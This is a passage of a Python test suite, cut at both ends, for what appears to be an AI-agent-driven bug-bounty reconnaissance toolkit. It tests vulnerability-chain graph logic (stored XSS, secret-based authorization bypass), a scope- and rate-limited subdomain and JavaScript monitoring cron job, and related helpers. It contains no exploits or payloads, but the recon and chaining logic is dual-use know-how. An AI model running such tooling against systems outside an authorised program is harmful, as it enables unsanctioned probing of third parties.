    def test_an_edge_between_unrelated_hosts_does_not_make_a_chain_walkable(self):
        """The adjacency guarantee, and the whole reason for the fix: a needs-edge chain is walkable
        only if a trust edge is incident to the host the primitive is ON. An edge between two OTHER
        hosts must land it in LINK MISSING, never READY — else the graph over-claims reachability."""
        out = self._run_chains(
            ["| H-1 | api.example.com | n-day | x | open | ev |\n"],
            ["2026-01-01\tfoo.example.com\tshares-backend\tbar.example.com\tobserved\tt\tev\n"])
        self.assertIn("LINK MISSING", out)
        self.assertIn("api.example.com", out)
        self.assertNotIn("✓ cluster-wide-nday", out, "must NOT be marked READY")

    def test_a_trust_edge_on_the_primitive_host_makes_the_chain_ready(self):
        """Same chain, but the edge is incident to the primitive host → READY, and it names the edge."""
        out = self._run_chains(
            ["| H-1 | api.example.com | n-day | x | open | ev |\n"],
            ["2026-01-01\tapi.example.com\tshares-backend\tapi2.example.com\tobserved\tt\tev\n"])
        self.assertIn("✓ cluster-wide-nday", out)
        self.assertIn("shares-backend on api.example.com", out)
        self.assertNotIn("LINK MISSING", out)

    def test_the_required_predicate_is_specific_not_any_edge(self):
        """cluster-wide-nday pivots over shares-backend; a `references` edge on the same host must
        NOT satisfy it — accepting any predicate is how the graph over-claimed before."""
        out = self._run_chains(
            ["| H-1 | api.example.com | n-day | x | open | ev |\n"],
            ["2026-01-01\tapi.example.com\treferences\tapi2.example.com\tobserved\tt\tev\n"])
        self.assertIn("LINK MISSING", out)
        self.assertNotIn("✓ cluster-wide-nday", out)

    def test_a_rejected_hypothesis_is_not_a_present_primitive(self):
        """A dismissed hypothesis must not be loaded as a chain primitive."""
        with tempfile.TemporaryDirectory() as d:
            t = self._brain(d, ["| H-1 | api.example.com | n-day | x | rejected | ev |\n"])
            prims = self.tg.load_primitives(t)
        self.assertNotIn("n-day", prims, "a rejected hypothesis is not a present primitive")

    def test_exact_host_match_rejects_lookalike_subdomains(self):
        """evilapi.example.com must not match api.example.com — no bare substring adjacency."""
        self.assertTrue(self.tg.host_match("api.example.com", "api.example.com"))
        self.assertTrue(self.tg.host_match("sub.api.example.com", "api.example.com"))
        self.assertFalse(self.tg.host_match("evilapi.example.com", "api.example.com"))

    def test_a_directed_edge_only_completes_in_the_declared_direction(self):
        """authz-bypass-via-secret needs shares-secret FROM the secret-recon host TO the FLA host.
        The reverse edge (FLA → secret host) must NOT complete it — direction decides whether the
        leaked key actually reaches the authenticated surface."""
        two = ["| H-1 | secrets.example.com | repository-and-secret-recon | x | open | ev |\n",
               "| H-2 | api.example.com | function-level-authorization | x | open | ev |\n"]
        wrong = self._run_chains(two,
            ["2026-01-01\tapi.example.com\tshares-secret\tsecrets.example.com\tobserved\tt\tev\n"])
        self.assertNotIn("✓ authz-bypass-via-secret", wrong, "reverse directed edge must not complete")
        self.assertIn("LINK MISSING", wrong)
        right = self._run_chains(two,
            ["2026-01-01\tsecrets.example.com\tshares-secret\tapi.example.com\tobserved\tt\tev\n"])
        self.assertIn("✓ authz-bypass-via-secret", right, "correct-direction edge must complete")

    def test_a_no_edge_chain_requires_its_primitives_co_located(self):
        """stored-xss needs no trust edge, but xss and csrf on UNRELATED hosts is not a stored-xss —
        the primitives must share a host."""
        same = self._run_chains(
            ["| H-1 | app.example.com | xss | x | open | ev |\n",
             "| H-2 | app.example.com | csrf | x | open | ev |\n"], [])
        self.assertIn("✓ stored-xss", same, "xss+csrf on one host completes it")
        diff = self._run_chains(
            ["| H-1 | a.example.com | xss | x | open | ev |\n",
             "| H-2 | b.example.net | csrf | x | open | ev |\n"], [])
        self.assertNotIn("✓ stored-xss", diff, "xss+csrf on unrelated hosts must NOT complete")
        self.assertIn("LINK MISSING", diff)

    def _summary_and_linkage(self, edge_rows, linkage_node):
        import io, contextlib
        with tempfile.TemporaryDirectory() as d:
            t = self._brain(d, [])
            (t / "observations.tsv").write_text(
                "date\tsubject\tpredicate\tobject\tconfidence\tsource\tevidence\n" + "".join(edge_rows))
            adj, ec, _ = self.tg.load_edges(t)
            prims = self.tg.load_primitives(t)
            sbuf, lbuf = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(sbuf):
                self.tg.cmd_summary(t, adj, ec, prims)
            with contextlib.redirect_stdout(lbuf):
                rc = self.tg.cmd_linkage(t, linkage_node, adj, prims)
            return sbuf.getvalue(), lbuf.getvalue(), rc

    def test_a_single_directed_edge_is_one_weak_component(self):
        """A lone directed a→b must be ONE weak component, not two one-host ones (and not order-
        dependent)."""
        s, _, _ = self._summary_and_linkage(
            ["2026-01-01\ta.example.com\treferences\tb.example.com\tobserved\tt\tev\n"], "a.example.com")
        self.assertIn("connected components   : 1", s)

    def test_linkage_from_the_object_of_a_directed_edge_sees_it_incoming(self):
        """Starting from b (the object of a→b) must find b in the graph and report the incoming edge,
        not claim 'no recorded trust edges'."""
        _, l, rc = self._summary_and_linkage(
            ["2026-01-01\ta.example.com\treferences\tb.example.com\tobserved\tt\tev\n"], "b.example.com")
        self.assertEqual(0, rc, "b is in the graph via its incoming edge")
        self.assertIn("incoming", l)
        self.assertIn("a.example.com", l)

    def test_chain_basis_is_the_weakest_required_class_not_the_strongest(self):
        """A chain with one confirmed finding and one candidate must read 'candidate', never
        'confirmed' — it is only as sound as its shakiest primitive."""
        import io, contextlib
        with tempfile.TemporaryDirectory() as d:
            t = self._brain(d, [])
            # stored-xss needs xss + csrf, no edge. Make xss confirmed, csrf a mere candidate.
            (t / "attack-surface.md").write_text(
                "| rank | entrypoint | vuln_class |\n|---|---|---|\n"
                "| 1 | app.example.com | csrf |\n")
            (t / "findings" / "confirmed").mkdir(parents=True)
            (t / "findings" / "confirmed" / "xss.md").write_text(
                "host: app.example.com\nclass: xss\n")
            prims = self.tg.load_primitives(t)
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                self.tg.cmd_chains(t, prims)
            out = buf.getvalue()
        self.assertIn("stored-xss", out)
        self.assertIn("basis: candidate", out, "weakest class governs the chain basis")
        self.assertNotIn("basis: confirmed", out)


class MonitorJobTests(unittest.TestCase):
    """The cron job is generated bash inside a Python .format string — a syntax error ships silently
    and the monitor never runs. And the module must cover the three dimensions it claims: subdomain
    names, status+tech on ALL names (changes, not just new), and a JS-content diff."""

    @classmethod
    def setUpClass(cls):
        cls.mon = load_tool("monitor")

    def _job(self, active=1, rate=45, max_js=800):
        m = self.mon
        block = (m.ACTIVE_BLOCK.replace("__HEADER_FLAGS__", "-H 'X-Bug-Bounty: t'")
                              .replace("__MAXJS__", str(max_js)))
        return m.REMOTE_SCRIPT.format(marker="bb-monitor", target="acme", min_ratio=50,
                                      keep_days=30, active=active, rate=rate, active_block=block)

    def test_generated_job_is_valid_bash(self):
        import subprocess, tempfile
        job = self._job()
        with tempfile.NamedTemporaryFile("w", suffix=".sh", delete=False) as f:
            f.write(job); path = f.name
        r = subprocess.run(["bash", "-n", path], capture_output=True, text=True)
        self.assertEqual(0, r.returncode, f"generated job is not valid bash:\n{r.stderr}")

    def test_no_unsubstituted_placeholders_leak_into_the_job(self):
        job = self._job()
        for leftover in ("__HEADER_FLAGS__", "__MAXJS__", "{active_block}", "{{", "}}"):
            self.assertNotIn(leftover, job, f"unsubstituted/leftover token in job: {leftover}")

    def test_job_covers_all_three_dimensions(self):
        job = self._job()
        self.assertIn("$STAMP-subdomains.txt", job, "subdomain-name snapshot missing")
        self.assertIn("-status-code -tech-detect", job, "status/tech probe missing")
        self.assertIn('< "$CUR"', job, "status/tech must run on ALL current names, not just new")
        self.assertIn("$STAMP-js.txt", job, "JS-content snapshot missing")
        self.assertIn("katana", job, "JS collection missing")
        self.assertIn("CHANGED", job, "must diff CHANGES, not only additions/removals")

    def test_http_and_js_snapshots_have_their_own_partial_quarantine(self):
        # a collapsed probe (CDN blocklist, crawl/fetch failure) must be quarantined, not published
        # as phantom removals — for BOTH the http AND the js dimension.
        job = self._job()
        self.assertIn("$HCUR.partial", job, "http snapshot needs a partial quarantine")
        self.assertIn("$JCUR.partial", job, "js snapshot needs its own partial quarantine (a fetch "
                                            "collapse must not diff as mass JS-GONE)")

    def test_js_urls_are_scheme_and_scope_validated_before_fetch(self):
        """Discovered JS URLs are candidates, not approved requests: only http/https, only in-scope
        hosts are fetched, and off-scope refs are recorded instead of hit with the attribution header."""
        job = self._job()
        self.assertIn("--proto '=http,https'", job, "curl must be restricted to http/https")
        self.assertIn("-js-external.txt", job, "off-scope JS refs must be recorded, not fetched")
        self.assertIn('grep -iE \'^https?://\'', job, "non-http(s) schemes must be dropped early")
        # the fetch host must be validated against the apex allowlist AND the exclusion list
        self.assertIn('-v af="$APEXES" -v xf="$EXCLUDES"', job, "JS hosts must be scope-filtered")

    def test_js_fetch_loop_carries_the_rate_limit(self):
        """httpx/katana get -rl; curl has no request-rate flag, so the loop must gate itself — else
        the program's rate limit does not apply to the JS path."""
        job = self._job()
        self.assertIn("DELAY=$(awk", job, "the curl loop needs a computed per-request delay")
        self.assertIn('sleep "$DELAY"', job, "each JS fetch must be rate-gated")

    def test_js_body_is_hashed_as_exact_bytes_not_normalised(self):
        """Only the URL KEY normalises hashed filenames; the body is hashed as EXACT bytes from a
        bounded file — no id-stripping and no whitespace-collapsing, both of which hide real changes
        (inside strings/templates/regex), and a shell var would drop NUL bytes and be unbounded."""
        job = self._job()
        self.assertNotIn("[0-9a-f]{16,}//g", job, "must NOT strip long hex from the body")
        self.assertNotIn("[0-9]{10,}//g", job, "must NOT strip long digits from the body")
        self.assertNotIn("tr -s '[:space:]'", job, "must NOT whitespace-collapse the body")
        self.assertIn('sha256sum < "$TMPJS"', job, "body hashed as exact bytes from a bounded file")
        self.assertIn("--max-filesize", job, "response size must be bounded")

    def test_missing_katana_fails_loud_not_silent(self):
        """A missing crawler is not 'no JS change' — it must log FAIL, and enable must require katana."""
        job = self._job()
        self.assertIn("katana not on PATH", job, "missing katana must be a loud FAIL in the job")
        # enable's remote tool-presence check must include katana when --active
        src = (Path(self.mon.__file__).read_text() if hasattr(self.mon, "__file__")
               else (ROOT / "tools" / "monitor.py").read_text())
        self.assertIn('["httpx", "katana"]', src, "enable must require katana for --active")

    def test_enable_rejects_zero_or_negative_operational_values(self):
        import io, contextlib
        m = self.mon
        cases = [(["--active", "--rate", "0"], "rate must be"),
                 (["--active", "--rate", "30", "--max-js", "0"], "max-js must be"),
                 (["--active", "--rate", "30", "--min-ratio", "0"], "min-ratio")]
        with tempfile.TemporaryDirectory() as d:
            t = Path(d) / "t"; t.mkdir(); (t / "index.md").write_text("# t\n")
            for extra, needle in cases:
                argv = ["monitor.py", "enable", str(t)] + extra + ["--yes"]
                saved, sys.argv = sys.argv, argv
                err = io.StringIO()
                try:
                    with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
                        rc = m.main()
                except SystemExit as e:
                    rc = e.code
                finally:
                    sys.argv = saved
                self.assertEqual(2, rc, f"{extra} must be refused with exit 2")
                self.assertIn(needle, err.getvalue(), f"{extra} must fail with a message naming the arg")

    def test_cmd_run_returns_the_real_remote_exit_not_a_false_success(self):
        """A failed manual run (script EXIT=2) must return 2, not 0 — the trailing echo used to make
        ssh succeed and turn a failed run into a false 'ok'."""
        import io, contextlib, types
        m = self.mon
        saved = (m.remote, m.target_of, m.cmd_status)

        def fake_remote(cmd, check=True, stdin=None):
            out = "yes" if "test -x" in cmd else "some log line\n__MONRC=2\n"
            return types.SimpleNamespace(stdout=out, stderr="", returncode=0)

        try:
            m.remote = fake_remote
            m.target_of = lambda a: types.SimpleNamespace(name="t")
            m.cmd_status = lambda a: 0
            args = types.SimpleNamespace(target="targets/t")
            with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                rc = m.cmd_run(args)
            self.assertEqual(2, rc, "a failed remote run must surface as exit 2")

            # and a clean run (EXIT=0) returns 0
            m.remote = lambda cmd, check=True, stdin=None: types.SimpleNamespace(
                stdout=("yes" if "test -x" in cmd else "__MONRC=0\n"), stderr="", returncode=0)
            with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                rc = m.cmd_run(args)
            self.assertEqual(0, rc)
        finally:
            m.remote, m.target_of, m.cmd_status = saved


class KnowledgeWorkflowTests(unittest.TestCase):
    """The build-time knowledge loop must work from its actual nested tool directory."""

    @classmethod
    def setUpClass(cls):
        def load(name):
            path = ROOT / "knowledge" / "tools" / f"{name}.py"
            spec = importlib.util.spec_from_file_location(f"test_knowledge_{name}", path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            return module

        cls.status = load("knowledge-status")
        cls.citations = load("check-citations")
        cls.dispositions = load("check-dispositions")

    def test_nested_tools_resolve_the_repository_root(self):
        self.assertEqual(ROOT, self.status.ROOT)
        self.assertEqual(ROOT, self.citations.ROOT)
        self.assertEqual(ROOT, self.dispositions.ROOT)
        fetcher = (ROOT / "knowledge" / "tools" / "h1-fetch.sh").read_text()
        self.assertIn('dirname "$0")/../..', fetcher)
        self.assertIn('"$ROOT/tools/config.py" env', fetcher)

    def test_hackerone_helper_reaches_repo_config_before_network(self):
        import shutil

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            script = root / "knowledge" / "tools" / "h1-fetch.sh"
            config = root / "tools" / "config.py"
            marker = root / "config-was-called"
            script.parent.mkdir(parents=True)
            config.parent.mkdir()
            shutil.copy2(ROOT / "knowledge" / "tools" / "h1-fetch.sh", script)
            config.write_text('#!/bin/sh\n: > "$MARKER"\n')
            config.chmod(0o755)
            environment = os.environ.copy()
            environment.pop("H1_USER", None)
            environment.pop("H1_TOKEN", None)
            environment["MARKER"] = str(marker)

            completed = subprocess.run(
                ["sh", str(script), "sql-injection", "TOPSQLI.md"],
                capture_output=True,
                text=True,
                env=environment,
            )
            self.assertEqual(2, completed.returncode)
            self.assertTrue(marker.exists(), "nested fetcher did not find repository tools/config.py")

    def test_legacy_manifest_is_migrated_in_memory(self):
        with tempfile.TemporaryDirectory() as directory:
            manifest = Path(directory) / "MINED.tsv"
            manifest.write_text(
                "class\tfile\tsha256\tmined_utc\tplaybook_sha256\n"
                "idor-bola\tmd/1.md\tsource-hash\t2026-01-01T00:00:00Z\tdestination-hash\n"
            )
            module = self.status
            saved = module.MANIFEST
            module.MANIFEST = manifest
            try:
                rows = module.load_manifest()
            finally:
                module.MANIFEST = saved
            row = rows[("idor-bola", "reports/idor-bola/md/1.md")]
            self.assertEqual("playbooks/vulns/idor-bola.md", row["destination"])

    def _invoke_status(self, module, argv):
        import contextlib
        import io

        saved = sys.argv
        output = io.StringIO()
        try:
            sys.argv = ["knowledge-status.py", *argv]
            with contextlib.redirect_stdout(output), contextlib.redirect_stderr(output):
                rc = module.main()
        finally:
            sys.argv = saved
        return rc, output.getvalue()

    def test_simple_knowledge_directory_round_trip(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            knowledge = root / "knowledge"
            subject = knowledge / "javascript-analysis"
            skills = root / "skills"
            subject.mkdir(parents=True)
            skills.mkdir()
            note = subject / "research.md"
            note.write_text("one useful observation\n")
            (skills / "javascript-analysis.md").write_text("# Existing method\n")

            module = self.status
            saved = (module.ROOT, module.KNOWLEDGE, module.MANIFEST, module.DESTINATION_DIRS)
            module.ROOT = root
            module.KNOWLEDGE = knowledge
            module.MANIFEST = knowledge / "MINED.tsv"
            module.DESTINATION_DIRS = (skills,)
            try:
                rc, out = self._invoke_status(module, ["javascript-analysis"])
                self.assertEqual(1, rc)
                self.assertIn("NEW", out)
                self.assertIn("javascript-analysis/research.md", out)

                rc, _ = self._invoke_status(module, ["javascript-analysis", "--record"])
                self.assertEqual(0, rc, "a successful record operation must not look like failure")
                rc, out = self._invoke_status(module, ["javascript-analysis"])
                self.assertEqual(0, rc)
                self.assertRegex(out, r"EVALUATED\s+1\b")

                note.write_text("a changed observation\n")
                rc, out = self._invoke_status(module, ["javascript-analysis"])
                self.assertEqual(1, rc)
                self.assertIn("CHANGED", out)
            finally:
                module.ROOT, module.KNOWLEDGE, module.MANIFEST, module.DESTINATION_DIRS = saved

    def test_legacy_report_layout_prefers_rendered_copy_but_keeps_raw_only_source(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            knowledge = root / "knowledge"
            corpus = knowledge / "reports" / "idor-bola"
            (corpus / "md").mkdir(parents=True)
            (corpus / "1.json").write_text('{"id": 1}')
            (corpus / "2.json").write_text('{"id": 2}')
            (corpus / "md" / "1.md").write_text("# rendered one\n")

            module = self.status
            saved = (module.ROOT, module.KNOWLEDGE)
            module.ROOT, module.KNOWLEDGE = root, knowledge
            try:
                files = {path.relative_to(corpus).as_posix() for path in module.source_files("idor-bola")}
            finally:
                module.ROOT, module.KNOWLEDGE = saved
            self.assertEqual({"md/1.md", "2.json"}, files)

    def test_subject_cannot_escape_knowledge_and_symlinks_are_not_inputs(self):
        import contextlib
        import io

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            knowledge = root / "knowledge"
            subject = knowledge / "safe-subject"
            subject.mkdir(parents=True)
            outside = root / "private.txt"
            outside.write_text("private\n")
            (subject / "linked.txt").symlink_to(outside)
            (subject / "note.md").write_text("public research\n")

            module = self.status
            saved = (module.ROOT, module.KNOWLEDGE)
            module.ROOT, module.KNOWLEDGE = root, knowledge
            try:
                files = module.source_files("safe-subject")
                with contextlib.redirect_stderr(io.StringIO()):
                    escaped = module.source_dir("../outside")
            finally:
                module.ROOT, module.KNOWLEDGE = saved
            self.assertEqual([subject / "note.md"], files)
            self.assertIsNone(escaped)

    def test_zero_list_limit_prints_every_changed_path(self):
        import contextlib
        import io

        entries = [(f"topic/note-{number}.md", str(number)) for number in range(12)]
        evaluation = self.status.Evaluation(
            "topic",
            tuple(Path(path) for path, _ in entries),
            {"NEW": entries, "CHANGED": [], "EVALUATED": [], "STALE": []},
            "skills/topic.md",
            "destination-hash",
        )
        output = io.StringIO()
        with contextlib.redirect_stdout(output):
            self.status.report(evaluation, 0)
        self.assertIn("topic/note-11.md", output.getvalue())
        self.assertNotIn("… and", output.getvalue())


class ToolReferenceLinterTests(unittest.TestCase):
    """self-check's coherence linter: a doc naming a renamed/deleted tool, or a command snippet
    whose --flag drifted from the tool, must fail — while knowledge/tools/ refs, valid flags, and
    passthrough args after `--` must NOT. This is the mechanical close of the skill↔tool drift gap."""

    @classmethod
    def setUpClass(cls):
        cls.sc = load_tool("self-check")
        cls.tools = ROOT / "tools"

    def _fails(self, body):
        with tempfile.TemporaryDirectory() as d:
            f = Path(d) / "doc.md"
            f.write_text(body)
            return self.sc._tool_reference_failures([f], self.tools)

    def test_missing_tool_reference_is_caught(self):
        self.assertTrue(any("does-not-exist.py" in f
                            for f in self._fails("see `tools/does-not-exist.py`\n")))

    def test_knowledge_tools_reference_is_not_a_false_positive(self):
        self.assertFalse(any("knowledge-status" in f
                             for f in self._fails("run `knowledge/tools/knowledge-status.py cors`\n")),
                         "knowledge/tools/ is a real dir; resolve there, not under tools/")

    def test_a_drifted_flag_in_a_snippet_is_caught(self):
        fails = self._fails("```\ntools/monitor.py enable targets/x --active --rate 30 --bogus-flag\n```\n")
        self.assertTrue(any("--bogus-flag" in f for f in fails))

    def test_valid_flags_and_subcommand_pass(self):
        fails = self._fails("```\ntools/monitor.py enable targets/x --active --rate 30 --max-js 400\n```\n")
        self.assertFalse(fails, f"valid flags must not be flagged: {fails}")

    def test_passthrough_after_double_dash_is_not_validated(self):
        fails = self._fails("```\ntools/run.py targets/x --phase 07 -- curl -H 'X: y' --insecure\n```\n")
        self.assertFalse(any("--insecure" in f for f in fails),
                         "args after -- belong to the wrapped command, not the tool")

    def test_prose_double_dash_is_not_treated_as_a_flag(self):
        self.assertFalse(self._fails("The tool is well-documented and battle-tested.\n"))

    def test_bracketed_optional_flag_is_still_validated(self):
        fails = self._fails("```\ntools/init-target.py x --scope y [--bogus-flag]\n```\n")
        self.assertTrue(any("--bogus-flag" in f for f in fails),
                        "a documented [--flag] must be validated, not silently skipped")

    def test_documented_valid_bracketed_flags_pass(self):
        fails = self._fails("```\ntools/init-target.py x --scope y [--exclude h] [--program u] --dry-run\n```\n")
        self.assertFalse(fails, f"valid bracketed flags must pass: {fails}")

    def test_a_dash_inside_a_quoted_value_is_not_a_flag(self):
        fails = self._fails("```\ntools/kb.py add targets/x --subject h --predicate runs "
                            "--object '--not-a-flag' --confidence observed\n```\n")
        self.assertFalse(any("--not-a-flag" in f for f in fails),
                         "a dash inside a quoted argument is not a tool flag")


class MonitorBehaviorTests(unittest.TestCase):
    """Behavioural, not string-matching: run the GENERATED job with stub executables and assert its
    real exit code. A recorded success must mean every active dimension completed — a failed httpx or
    katana must make the whole run exit 2, not 0."""

    @classmethod
    def setUpClass(cls):
        cls.mon = load_tool("monitor")

    STUBS = {
        "flock": "#!/bin/sh\nexit 0\n",
        "mktemp": "#!/bin/bash\nt=\"/tmp/monbeh.$$.$RANDOM\"\n: > \"$t\"\necho \"$t\"\n",
        "sha256sum": "#!/bin/sh\ncat >/dev/null\necho 'abcdef0123456789  -'\n",
        "subfinder": "#!/bin/sh\nprintf 'www.acme.com\\napi.acme.com\\n'\n",
        "httpx": ("#!/bin/sh\n[ \"${MON_HTTPX_RC:-0}\" != 0 ] && exit \"$MON_HTTPX_RC\"\n"
                  "while IFS= read -r h; do printf '%s [200] [nginx]\\n' \"$h\"; done\n"),
        "katana": "#!/bin/sh\necho 'https://www.acme.com/app.js'\nexit \"${MON_KATANA_RC:-0}\"\n",
        "curl": ("#!/bin/sh\nout=\"\"\nwhile [ $# -gt 0 ]; do [ \"$1\" = \"-o\" ] && { shift; out=\"$1\"; }; shift; done\n"
                 "[ -n \"$out\" ] && printf 'console.log(1)\\n' > \"$out\"\nexit 0\n"),
    }

    def _run_job(self, env_extra=None):
        import subprocess
        m = self.mon
        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as bindir:
            tdir = Path(home) / "targets" / "acme"
            (tdir / "raw" / "snapshots").mkdir(parents=True)
            (tdir / "logs").mkdir(parents=True)
            (tdir / "monitor-apexes.txt").write_text("acme.com\n")
            (tdir / "monitor-excludes.txt").write_text("")
            for name, body in self.STUBS.items():
                f = Path(bindir) / name
                f.write_text(body)
                f.chmod(0o755)
            block = (m.ACTIVE_BLOCK.replace("__HEADER_FLAGS__", "-H 'X: y'").replace("__MAXJS__", "50"))
            job = m.REMOTE_SCRIPT.format(marker="bb", target="acme", min_ratio=50,
                                        keep_days=30, active=1, rate=30, active_block=block)
            script = Path(bindir) / "monitor.sh"
            script.write_text(job)
            env = {"HOME": home, "PATH": f"{bindir}:{os.environ.get('PATH','')}"}
            env.update(env_extra or {})
            r = subprocess.run(["bash", str(script)], env=env, capture_output=True, text=True, timeout=60)
            log = (tdir / "logs" / "monitor.log").read_text() if (tdir / "logs" / "monitor.log").exists() else ""
            return r.returncode, log

    def test_a_clean_run_exits_zero(self):
        rc, log = self._run_job()
        if "INIT   baseline" not in log and "baseline" not in log:
            self.skipTest(f"job could not run in this environment (no baseline logged):\n{log[:400]}")
        self.assertEqual(0, rc, f"a clean baseline run must exit 0.\nlog:\n{log}")

    def test_httpx_failure_makes_the_run_exit_2(self):
        rc, log = self._run_job({"MON_HTTPX_RC": "1"})
        if not log:
            self.skipTest("job could not run in this environment")
        self.assertEqual(2, rc, f"a failed httpx must degrade the whole run to exit 2.\nlog:\n{log}")
        self.assertIn("FAIL", log)

    def test_katana_failure_makes_the_run_exit_2(self):
        rc, log = self._run_job({"MON_KATANA_RC": "1"})
        if "baseline" not in log:
            self.skipTest("job could not run in this environment")
        self.assertEqual(2, rc, f"a failed katana crawl must degrade the run to exit 2.\nlog:\n{log}")
        self.assertIn("katana exit 1", log)


class ClusterTests(unittest.TestCase):
    """cluster.py reduces exact response repetitions without promoting them to backend facts."""

    @classmethod
    def setUpClass(cls):
        cls.cl = load_tool("cluster")

    def _c(self, rows, min_hosts=2, edge=8, status=200):
        return self.cl.cluster(iter(rows), min_hosts, edge, status)

    def test_dedup_counts_apps_and_deployments_on_the_pair(self):
        rows = [
            {"host": "a.x", "host_ip": "1.1.1.1", "status_code": 200, "hash": {"body_mmh3": "x"}},
            {"host": "b.x", "host_ip": "1.1.1.1", "status_code": 200, "hash": {"body_mmh3": "x"}},
            {"host": "c.x", "host_ip": "2.2.2.2", "status_code": 200, "hash": {"body_mmh3": "y"}},
        ]
        clusters, stats = self._c(rows)
        self.assertEqual(2, stats["apps"], "two distinct body hashes")
        self.assertEqual(2, stats["deployments"], "two distinct (body,ip) pairs")
        self.assertEqual(1, len(clusters), "only (x,1.1.1.1) has >=2 hosts")

    def test_render_never_calls_response_groups_apps_or_backends(self):
        rows = [
            {"host": "a.x", "host_ip": "1.1.1.1", "status_code": 200,
             "hash": {"body_mmh3": "x"}},
            {"host": "b.x", "host_ip": "1.1.1.1", "status_code": 200,
             "hash": {"body_mmh3": "x"}},
        ]
        groups, stats = self._c(rows)
        rendered = self.cl.render(
            groups, stats, "t", {"catchall": 40, "limit": 25, "hosts": 4, "min": 2})
        self.assertIn("UNCONFIRMED", rendered)
        self.assertIn("not app counts", rendered)
        self.assertNotIn("distinct app", rendered.lower())
        self.assertNotIn("SHARED-APP", rendered)

    def test_a_host_equal_to_its_ip_is_not_a_hostname(self):
        rows = [
            {"host": "1.1.1.1", "host_ip": "1.1.1.1", "status_code": 200, "hash": {"body_mmh3": "x"}},
            {"host": "a.x", "host_ip": "1.1.1.1", "status_code": 200, "hash": {"body_mmh3": "x"}},
        ]
        clusters, _ = self._c(rows)
        self.assertEqual([], clusters, "the bare-IP row must not count as a second hostname")

    def test_cdn_cname_is_an_annotation_not_a_suppression(self):
        rows = [
            {"host": "a.x", "host_ip": "9.9.9.9", "status_code": 200, "cname": ["e.cloudfront.net"],
             "hash": {"body_mmh3": "z"}},
            {"host": "b.x", "host_ip": "9.9.9.9", "status_code": 200, "cname": ["e.cloudfront.net"],
             "hash": {"body_mmh3": "z"}},
        ]
        clusters, _ = self._c(rows)
        self.assertEqual(1, len(clusters), "a CDN cluster is still a cluster")
        self.assertTrue(clusters[0]["cdn"], "and is annotated, not dropped")

    def test_an_ip_answering_many_bodies_is_an_edge(self):
        rows = [{"host": f"h{i}.x", "host_ip": "5.5.5.5", "status_code": 200,
                 "hash": {"body_mmh3": str(i)}} for i in range(8)]
        rows.append({"host": "h0b.x", "host_ip": "5.5.5.5", "status_code": 200,
                     "hash": {"body_mmh3": "0"}})       # makes (0,5.5.5.5) a 2-host cluster
        clusters, _ = self._c(rows, edge=8)
        self.assertTrue(clusters and clusters[0]["edge_ip"], "8 distinct bodies on one IP = edge")

    def test_non_200_excluded_by_default(self):
        rows = [
            {"host": "a.x", "host_ip": "1.1.1.1", "status_code": 301, "hash": {"body_mmh3": "x"}},
            {"host": "b.x", "host_ip": "1.1.1.1", "status_code": 301, "hash": {"body_mmh3": "x"}},
        ]
        clusters, stats = self._c(rows)
        self.assertEqual(0, stats["kept"])
        self.assertEqual([], clusters)

    def test_no_body_hashes_fails_loud(self):
        import io, contextlib, os
        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
            f.write('{"host":"a.x","host_ip":"1.1.1.1","status_code":200}\n')
            path = f.name
        saved = sys.argv
        try:
            sys.argv = ["cluster.py", "--from", path]
            with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                rc = self.cl.main()
        finally:
            sys.argv = saved
            os.unlink(path)
        self.assertEqual(1, rc, "a run with no body hashes is a soft fail, not zero clusters")


class RouterAgreementTests(unittest.TestCase):
    """self-check now mechanically enforces the AGENTS.md router ↔ runtime dispatch agreement: the
    router must name only real skills, and its advertised count must equal the dispatchers."""

    @classmethod
    def setUpClass(cls):
        cls.sc = load_tool("self-check")
        cls.skills = ROOT / "skills"
        cls.dispatch = ROOT / ".claude" / "skills"

    def test_the_repo_router_agrees(self):
        self.assertFalse(self.sc.check_router_agreement(), "the shipped router must agree")

    def test_a_router_row_naming_a_missing_skill_is_caught(self):
        fails = self.sc._router_agreement_failures("load `skills/ghost.md`\nexposes all **32** skills",
                                                   self.skills, self.dispatch)
        self.assertTrue(any("ghost.md" in f for f in fails))

    def test_a_drifted_skill_count_is_caught(self):
        fails = self.sc._router_agreement_failures("exposes all **999** skills", self.skills, self.dispatch)
        self.assertTrue(any("advertises 999" in f for f in fails))

    def test_a_missing_count_claim_is_caught(self):
        fails = self.sc._router_agreement_failures("no count here", self.skills, self.dispatch)
        self.assertTrue(any("no longer states the skill count" in f for f in fails))


class ResumeRoutingTests(unittest.TestCase):
    """Resume must send a fresh model to a skill that EXISTS. `runs.tsv` holds historical names
    like `02-subdomain-enumeration`; the numbered files were deleted in the slug migration, so
    telling the model to 'load the 02-subdomain-enumeration playbook' points at a ghost."""

    @classmethod
    def setUpClass(cls):
        cls.brief = load_tool("brief")

    def test_numeric_prefix_is_stripped_to_a_real_skill(self):
        for raw in ("02-subdomain-enumeration", "subdomain-enumeration",
                    "phase-02-subdomain-enumeration", "07-http-probing"):
            with self.subTest(raw=raw):
                slug, path = self.brief.resume_skill(raw)
                self.assertIsNotNone(path, f"{raw} should resolve to a real skill file")
                self.assertTrue(path.startswith("skills/") and path.endswith(".md"))
                self.assertTrue((ROOT / path).is_file())

    def test_an_unresolvable_name_fails_loud_not_silent(self):
        slug, path = self.brief.resume_skill("99-does-not-exist")
        self.assertIsNone(path, "a name with no current skill must not be presented as loadable")
        self.assertEqual("does-not-exist", slug)

    def test_monitor_attention_is_parsed_from_status(self):
        import types
        status = types.SimpleNamespace(
            returncode=0,
            stdout=("# monitor — acme\n"
                    "  snapshots   7 good · 2 quarantined (.partial)\n"
                    "  pending     3 unreviewed delta block(s)\n"
                    "    2026-01-01T00:00:00Z  FAIL   source collapsed\n"),
            stderr="",
        )
